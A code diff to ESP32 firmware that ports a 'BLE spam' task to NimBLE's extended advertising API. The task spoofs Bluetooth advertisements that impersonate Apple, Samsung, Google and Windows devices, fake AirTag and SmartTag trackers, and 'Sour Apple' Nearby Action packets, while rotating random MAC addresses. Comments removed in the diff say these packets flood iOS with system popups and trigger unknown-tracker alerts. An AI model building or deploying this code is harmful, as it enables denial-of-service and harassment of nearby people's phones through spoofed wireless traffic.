@@ -253,6 +253,7 @@ static int bt_device_count = 0;
 #define BLE_SPAM_MODE_AIRTAG      5
 #define BLE_SPAM_MODE_SMARTTAG    6
 #define BLE_SPAM_MODE_SOUR_APPLE  7
+#define BLE_SPAM_ADV_INSTANCE     1
 static volatile bool ble_spam_active = false;
 static TaskHandle_t ble_spam_task_handle = NULL;
 static lv_obj_t *ble_spam_status_label = NULL;
@@ -29372,22 +29373,35 @@ static void ble_spam_task(void *pvParameters)
     (void)pvParameters;
     int apple_idx = 0, samsung_idx = 0, google_idx = 0, windows_idx = 0;
     int airtag_idx = 0, smarttag_idx = 0, sour_apple_idx = 0;
-    int mode_round = 0; // cycles through modes when ALL
+    int mode_round = 0;
+
+    // Configure extended advertising once at task start
+    struct ble_gap_ext_adv_params ext_adv_params;
+    memset(&ext_adv_params, 0, sizeof(ext_adv_params));
+    ext_adv_params.connectable = 0;
+    ext_adv_params.scannable = 0;
+    ext_adv_params.legacy_pdu = 1;
+    ext_adv_params.own_addr_type = BLE_OWN_ADDR_RANDOM;
+    ext_adv_params.primary_phy = BLE_HCI_LE_PHY_1M;
+    ext_adv_params.secondary_phy = BLE_HCI_LE_PHY_1M;
+    ext_adv_params.itvl_min = BLE_GAP_ADV_ITVL_MS(100);
+    ext_adv_params.itvl_max = BLE_GAP_ADV_ITVL_MS(150);
+    ext_adv_params.sid = BLE_SPAM_ADV_INSTANCE;
+
+    int rc = ble_gap_ext_adv_configure(BLE_SPAM_ADV_INSTANCE, &ext_adv_params, NULL, NULL, NULL);
+    if (rc != 0) {
+        ESP_LOGE(TAG, "BLE Spam: ext_adv_configure failed: %d", rc);
+        ble_spam_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
 
     while (ble_spam_active) {
-        // Rotate random address each cycle so scanners see a new device every packet.
-        // Without this every advertisement comes from the same MAC and nRF Connect
-        // updates the same row instead of showing a new device.
+        // Rotate random address each cycle
         ble_addr_t rnd_addr;
-        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0)
-            ble_hs_id_set_rnd(rnd_addr.val);
-
-        ble_gap_adv_stop();
-        // Brief yield so NimBLE host task can process the stop event and free
-        // internal advertising resources before we set new fields. Without this
-        // the mbuf pool and event queue drain slowly until ~1400 cycles in the
-        // host asserts / watchdog fires.
-        vTaskDelay(pdMS_TO_TICKS(10));
+        if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
+            ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
+        }
 
         struct ble_hs_adv_fields fields;
         memset(&fields, 0, sizeof(fields));
@@ -29408,8 +29422,8 @@ static void ble_spam_task(void *pvParameters)
         bool use_svc = false;
         const uint8_t *svc_data = NULL;
         uint8_t svc_data_len = 0;
-        uint8_t at_mfg[29]; // AirTag Find My manufacturer data buffer
-        uint8_t sa_mfg[9];  // Sour Apple Nearby Action buffer
+        uint8_t at_mfg[29];
+        uint8_t sa_mfg[9];
 
         switch (cur_mode) {
         case BLE_SPAM_MODE_APPLE:
@@ -29429,15 +29443,13 @@ static void ble_spam_task(void *pvParameters)
             google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
             break;
         case BLE_SPAM_MODE_AIRTAG: {
-            // Apple Find My: MAC = key[0..5] (reversed, static-random bits set on val[5])
-            // Mfg data: company(2) + type 0x12(1) + len 0x19(1) + status(1) + key[6..27](22) + hint(1) + pad(1)
             const uint8_t *k = s_airtag_keys[airtag_idx];
             airtag_idx = (airtag_idx + 1) % AIRTAG_KEY_COUNT;
             ble_addr_t at_addr;
             at_addr.val[0] = k[5]; at_addr.val[1] = k[4];
             at_addr.val[2] = k[3]; at_addr.val[3] = k[2];
             at_addr.val[4] = k[1]; at_addr.val[5] = k[0] | 0xC0;
-            ble_hs_id_set_rnd(at_addr.val);
+            ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &at_addr);
             at_mfg[0] = 0x4C; at_mfg[1] = 0x00;
             at_mfg[2] = 0x12; at_mfg[3] = 0x19;
             at_mfg[4] = 0x10;
@@ -29449,28 +29461,23 @@ static void ble_spam_task(void *pvParameters)
             break;
         }
         case BLE_SPAM_MODE_SMARTTAG:
-            // Samsung SmartTag Offline Finding: service UUID 0xFD5A + 20-byte payload
-            // Triggers "Unknown Tracker" alert in Samsung SmartThings Find on helper phones.
             use_svc = true;
             svc_data = s_smarttag_payloads[smarttag_idx];
             svc_data_len = sizeof(s_smarttag_payloads[0]);
             smarttag_idx = (smarttag_idx + 1) % SMARTTAG_PAYLOAD_COUNT;
             break;
         case BLE_SPAM_MODE_SOUR_APPLE: {
-            // Apple Nearby Action (0x0F) — different from Proximity Pairing (0x10).
-            // Cycling through action types floods iOS with system-level popups:
-            // device setup, AirDrop, HomePod, Apple Watch pairing, AirPlay, Handoff.
             static const uint8_t sa_actions[] = {
                 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0
             };
-            sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;   // Apple company ID
-            sa_mfg[2] = 0x0F;                        // Nearby Action type
-            sa_mfg[3] = 0x05;                        // action data length
-            sa_mfg[4] = 0xC1;                        // action flags
+            sa_mfg[0] = 0x4C; sa_mfg[1] = 0x00;
+            sa_mfg[2] = 0x0F;
+            sa_mfg[3] = 0x05;
+            sa_mfg[4] = 0xC1;
             sa_mfg[5] = sa_actions[sour_apple_idx % (int)sizeof(sa_actions)];
             sour_apple_idx++;
-            esp_fill_random(&sa_mfg[6], 3);          // random auth tag
-            fields.mfg_data     = sa_mfg;
+            esp_fill_random(&sa_mfg[6], 3);
+            fields.mfg_data = sa_mfg;
             fields.mfg_data_len = sizeof(sa_mfg);
             break;
         }
@@ -29488,24 +29495,28 @@ static void ble_spam_task(void *pvParameters)
             fields.svc_data_uuid16_len = svc_data_len;
         }
 
-        int rc = ble_gap_adv_set_fields(&fields);
-        if (rc == 0) {
-            struct ble_gap_adv_params adv_params;
-            memset(&adv_params, 0, sizeof(adv_params));
-            adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
-            adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
-            adv_params.itvl_min = BLE_GAP_ADV_FAST_INTERVAL1_MIN;
-            adv_params.itvl_max = BLE_GAP_ADV_FAST_INTERVAL1_MAX;
-            ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
-                              &adv_params, NULL, NULL);
+        // Set advertisement data using extended API
+        struct os_mbuf *om = os_msys_get_pkthdr(BLE_HS_ADV_MAX_SZ, 0);
+        if (om) {
+            rc = ble_hs_adv_set_fields_mbuf(&fields, om);
+            if (rc == 0) {
+                rc = ble_gap_ext_adv_set_data(BLE_SPAM_ADV_INSTANCE, om);
+                if (rc == 0) {
+                    ble_gap_ext_adv_start(BLE_SPAM_ADV_INSTANCE, 0, 0);
+                } else {
+                    os_mbuf_free_chain(om);
+                }
+            } else {
+                os_mbuf_free_chain(om);
+            }
         }
 
-        vTaskDelay(pdMS_TO_TICKS(170)); // 10 + 170 = 180 ms total per cycle
+        vTaskDelay(pdMS_TO_TICKS(180));
         ble_spam_count++;
         ble_spam_needs_ui_update = true;
     }
 
-    ble_gap_adv_stop();
+    ble_gap_ext_adv_stop(BLE_SPAM_ADV_INSTANCE);
     ble_spam_task_handle = NULL;
     vTaskDelete(NULL);
 }
